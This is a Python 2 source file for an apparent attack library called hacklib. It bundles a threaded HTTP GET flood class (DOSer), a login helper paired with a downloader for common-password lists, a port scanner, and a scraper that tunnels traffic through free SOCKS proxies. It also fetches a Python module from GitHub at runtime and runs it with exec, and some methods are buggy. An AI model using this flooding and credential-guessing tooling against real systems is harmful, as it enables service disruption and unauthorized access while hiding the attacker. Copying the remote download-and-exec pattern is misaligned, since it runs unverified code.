'''The MIT License (MIT)

Copyright (c) 2016 Leon Li (leon@apolyse.com)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and
associated documentation files (the "Software"), to deal in the Software without restriction, including
without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to
the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial
portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT
HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF
CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.'''

import socket, httplib, threading, time, urllib2
from Queue import Queue

class FTPAuth(object):
    '''FTP login and command handler.
    Commands:
                    login() Args: username, password
                    send() Args: message
    '''

    def __init__(self, IP, port=21):
        self.IP = IP
        self.port = port
        self.username = ''
        self.password = ''
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.settimeout(8)
        self.s.connect((self.IP, self.port))
        self.s.recv(1024)

    def send(self, message):
        self.s.send(message)
        return self.s.recv(2048)

    def login(self, username, password):
        self.send('USER ' + username + '\r\n')
        response = self.send('PASS ' + password + '\r\n')
        if '230' in response:
            return
        else:
            raise Exception(response)
        
class AuthClient(object):
    '''Universal login tool for most login pages as well as HTTP Basic Authentication.
    Commands:
                    login() Args: url, username, password
    '''

    def __init__(self):
        self.url = ''
        self.username = ''
        self.password = ''

    def _get_login_type(self):
        try:
            # Attempts to urlopen target URL without exception
            data = urllib2.urlopen(self.url)
            return 'FORM'
        except Exception, e:
            if 'error 401' in str(e).lower():
                return 'BA'
            if 'timed out' in str(e).lower():
                return 'TO'
            
    def _login_mechanize(self):
        try:
            import mechanize
        except:
            raise Exception('Please install the mechanize module before continuing.')
        # Sets up common input names/ids and creates instance of mechanize.Browser()
        userfields = ['user', 'username', 'usr', 'email', 'name', 'login', 'userid', 'userid-input', 'player']
        passfields = ['pass', 'password', 'passwd', 'pw', 'pwd']
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_refresh(False)
        br.addheaders = [('User-agent', 'googlebot')]
        # Opens URL and lists controls
        response = br.open(self.url)
        loginurl = response.geturl()
        br.form = list(br.forms())[0]
        username_control = ''
        password_control = ''
        # Locates username and password input, and submits login info
        for control in br.form.controls:
            if control.name and control.name.lower() in userfields or control.id and control.id.lower() in userfields: username_control = control
            if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        username_control.value = self.username
        try: password_control.value = self.password
        except:
            # Detected a username input but not a password input.
            # Submits form with username and attempts to detect password input in resulting page
            response = br.submit()
            br.form = list(br.forms())[0]
            for control in br.form.controls:
                if control.name and control.name.lower() in passfields or control.id and control.id.lower() in passfields: password_control = control
        password_control.value = self.password
        response = br.submit()
        # Returns response if the URL is changed. Assumes login failure if URL is the same
        if response.geturl() != loginurl:
            return response.read()
        else:
            raise Exception('Login credentials incorrect.')

    def _login_BA(self):
        try:
            # Creates a PasswordMgr instance
            passmanager = urllib2.HTTPPasswordMgrWithDefaultRealm()
            passmanager.add_password(None, self.url, self.username, self.password)
            # Creates an auth handling object and builds it with opener
            auth = urllib2.HTTPBasicAuthHandler(passmanager)
            opener = urllib2.build_opener(auth)
            response = opener.open(self.url, timeout=8)
            data = response.read()
            response.close()
            return data
        except Exception, e:
            if 'Error 401' in str(e):
                raise Exception('Login credentials incorrect.')
            
    def login(self, url, username, password):
        self.url = url
        self.username = username
        self.password = password
        # ascertain the type of login page given by url
        logintype = self. _get_login_type()
        if logintype == 'BA':
            # attempts to login with BA method and return html
           return self._login_BA()
        if logintype == 'TO':
            raise Exception('Request timed out.')
        if logintype == 'FORM':
            return self._login_mechanize()

class DOSer(object):
    '''Hits a host with GET requests on default port 80 from multiple threads.
    Commands:
                    launch() Args: host, duration, threads(default 1), port(default 80),
                    payload(default crocodile)
    '''

    def __init__(self):
        self.target = '127.0.0.1'
        self.port = 80
        self.threads = 1
        self.payload = '?INTERIORCROCODILEALLIGATORIDRIVEACHEVROLETMOVIETHEATER'
        self.start_time = 0
        self.time_length = 1

    def _attack(self, target):  
        # Sends GET requests for time_length duration
        while int(time.time()) < self.start_time + self.time_length:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            try:
                s.connect((self.target, self.port))
                s.send("GET /" + self.payload + " HTTP/1.1\r\n")  
                s.send("Host: " + self.target  + "\r\n\r\n")
            except: pass

    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._attack(self.worker)
            self.q.task_done()

    def launch(self, host, duration, threads = 1, port = 80, payload = 'default'):
        '''Launches threaded GET requests for (duration) seconds.
        '''
        self.target = host
        self.port = port
        self.threads = threads
        self.start_time = int(time.time())
        self.time_length = duration
        if payload != 'default': self.payload = payload
        # Creates queue to hold each thread
        self.q = Queue()
        #print '> Launching ' + str(threads) + ' threads for ' + str(duration) + ' seconds.'
        for i in range(threads):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(0, threads):
            self.q.put(worker)

        self.q.join()
        return

class PortScanner(object):
    '''Scan an IP address using scan(host) with default port range 1-1024.
    Commands:
                    scan() Args: IP, port_range(default 1024), timeout(default 1), verbose(default True)
    '''

    def __init__(self):
        self.IP = '127.0.0.1'
        self.port_range = '1025'
        self.print_lock = threading.Lock()
        self.timeout = 2
        self.openlist = []
        self.verbose = True

    def _portscan(self, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.timeout)
        # Tries to establish a connection to port, and append to list of open ports
        try:
            con = s.connect((self.IP,port))
            response = s.recv(1024)
            self.openlist.append(port)
            if self.verbose:
                with self.print_lock:
                    print 'Port', str(port) + ':'
                    print response
            s.close()
        # If the connection fails, tries to establish HTTP connection if port is a common HTTP port
        except Exception, e:
            httplist = [80, 81, 443, 1900, 2082, 2083, 8080, 8443]
            if port in httplist:
                try:
                    headers = '''GET /HTTP/1.1
Host: ''' + self.IP + '''
User-Agent: googlebot
Accept: text/html, application/xhtml+xml, application/xml; q=09, */*; q=0.8
Accept-Language: en-US, en; q=0.5
Accept-Encoding: gzip, deflate''' + '\r\n\r\n'
                    s.send(headers)
                    response = s.recv(1024)
                    self.openlist.append(port)
                    if self.verbose:
                        with self.print_lock:
                            print 'Port', str(port) + ':'
                            print response
                    s.close()
                except: pass
                
    def portOpen(self, port):
        if port in self.openlist:
            return
        else:
            return False
        
    def _threader(self):
        while True:
            self.worker = self.q.get()
            self._portscan(self.worker)
            self.q.task_done()

    def scan(self, IP, port_range = (1, 1025), timeout = 1, verbose = True):
        '''Scans ports of an IP address. Use getIP() to find IP address of host.
        '''
        self.openlist = []
        self.IP = IP
        self.port_range = port_range
        self.timeout = 1
        # Creates queue to hold each thread
        self.q = Queue()
        for x in range(30):
            t = threading.Thread(target=self._threader)
            t.daemon = True
            t.start()
        # Adds workers to queue
        for worker in range(port_range[0], port_range[1]):
            self.q.put(worker)

        self.q.join()

class Proxy(object):
    '''Can work in conjunction with getProxies() to tunnel all
    network activity in the Python script through a Socks4/5 proxy.
    Commands:
                    connect() Args: getProxies(), timeout=10
                    connect_manual() Args: IP, port, proxy_type
    '''
    
    def __init__(self):
        self.IP = ''
        self.port = ''
        self.proxy_type = ''
        self.country = ''
        self._socksfile = urllib2.urlopen('https://raw.githubusercontent.com/Anorov/PySocks/master/socks.py').read()
        global socks
        # Dynamically import socks.py from the internet
        socks = importFromString(self._socksfile, 'socks')

    def connect(self, proxies, timeout=10):
        for proxy in proxies:
            if proxy[4] == 'Socks4':
                self.proxy_type = socks.PROXY_TYPE_SOCKS4
            else:
                self.proxy_type = socks.PROXY_TYPE_SOCKS5
            try:
                # Sets the socket.socket class to the socks module's socksocket class
                socks.setdefaultproxy(self.proxy_type, proxy[0], int(proxy[1]))
                socket.socket = socks.socksocket
                # Tests to see if the proxy can open a webpage
                currentIP = urllib2.urlopen('http://icanhazip.com/', timeout = timeout).read().split()[0]
                self.IP = proxy[0]
                self.port = int(proxy[1])
                self.country = proxy[2]
                return
            except: pass
        raise Exception('Couldn\'t connect to any proxies.')

    def connect_manual(IP, port, proxy_type='Socks5'):
        if proxy_type == 'Socks4':
            self.proxy_type = socks.PROXY_TYPE_SOCKS4
        else:
            self.proxy_type = socks.PROXY_TYPE_SOCKS5
        try:
            socks.setdefaultproxy(self.proxy_type, IP, port)
            socket.socket = socks.socksocket
            currentIP = urllib2.urlopen('http://icanhazip.com/').read().split()[0]
            self.IP = IP
            self.port = port
            return currentIP
        except: raise Exception('Connection failed.')


def importFromString(code, name):
    """Import dynamically generated code as a module.
    Args: code: a string, a file handle, or a compiled binary
    name: the name of the module
    """
    import sys, imp
    module = imp.new_module(name)
    exec code in module.__dict__
    return module


def getIP(host):
    return socket.gethostbyname(host)

def getProxies(country_filter = 'ALL', proxy_type = ('Socks4', 'Socks5')):
    '''Gets list of recently tested Socks4/5 proxies.
    Return format is as follows:
    [IP, Port, Country Code, Country, Proxy Type, Anonymous, Yes/No, Last Checked]
    Args: country_filter: Specify country codes within a tuple, e.g. ('US', 'MX')
    proxy_type: Specify whic Socks version to use, e.g. 'Socks5'
    '''
    try: import mechanize
    except: raise Exception('Please install the mechanize module before continuing.')
    try: from bs4 import BeautifulSoup
    except: raise Exception('Please install the beautifulsoup4 module before continuing.')
    br = mechanize.Browser()
    br.set_handle_robots(False)
    br.addheaders = [('User-agent', 'googlebot')]
    data = br.open('http://www.socks-proxy.net').read()
    soup = BeautifulSoup(data, 'html.parser')
    proxylist = []
    table = soup.find('table')
    tbody = table.find('tbody')
    rows = tbody.find_all('tr')
    for row in rows:
        cols = row.find_all('td')
        cols = [ele.text.strip() for ele in cols]
        proxylist.append([ele for ele in cols if ele])
    filteredlist = []
    if not country_filter == 'ALL':
        for proxy in proxylist:
            if proxy[2] in country_filter:
                filteredlist.append(proxy)
        proxylist = filteredlist
        filteredlist = []
    if not proxy_type == ('Socks4', 'Socks5'):
        for proxy in proxylist:
            if not country_filter == 'ALL':
                if proxy[4] in proxy_type and proxy[2] in country_filter:
                    filteredlist.append(proxy)
            else:
                if proxy[4] in proxy_type: filteredlist.append(proxy)
        proxylist = filteredlist
    return proxylist

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
def send(IP, port, message, keepalive = False):
    '''Creates new socket and sends a TCP message. If keepalive is true, use hacklib.sock
    to handle socket and hacklib.sock.close() when finished.
    '''
    if keepalive:
        global sock
    else:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((IP, port))
    sock.send(message)
    response = sock.recv(2048)
    if not keepalive:
        sock.close()
    return response

def topPasswords(amount):
    '''Get up to 1,000,000 most common passwords.
    '''
    url = 'https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/10_million_password_list_top_100000.txt'
    passlist = urllib2.urlopen(url).read().split('\n')
    return passlist[:amount]

def userInterface():
    '''Start text-based interface for easier usage if hacklib isn't being used as a library.
    '''
    while True:
        print 'Enter an IP address or URL for further options.'
        print 'Or, enter "proxy" to connect to a proxy.'
        cmd = raw_input('> ')
        if '.' in cmd: # Checks for . to make sure it's an IP or URL
            address = getIP(cmd)
            print 'What would you like to do?'
            print '1) PortScan'
            print '2) DOS'
            print '3) Send TCP message'
            print '4) Attempt login'
            cmd = getIP(raw_input('> '))
        elif 'proxy' in cmd:
            print 'Would you like to automatically find a proxy or input one manually?'
            print 'Enter the number corresponding to your choice.'
            print '1) Auto'
            print '2) Manual'
            cmd = raw_input('> ')
            proxies = getProxies()
            global proxy
            proxy = Proxy()
            if cmd == '1':
                proxy.connect(getProxies())
                print 'Your new IP address is ' + proxy.IP
                print 'This proxy is located in ' + proxy.country
            elif cmd == '2':
                pr_address = raw_input('Proxy address > ')
                pr_port = raw_input('Proxy port > ')
                pr_type = raw_input('Enter "Socks4" or "Socks5" > ')
                try: proxy.connect_manual(pr_address, pr_port, pr_type)
                except: print 'Connection failed.'; pass
                print 'Proxy connected.'
                pass

if __name__ == '__main__':
    userInterface()
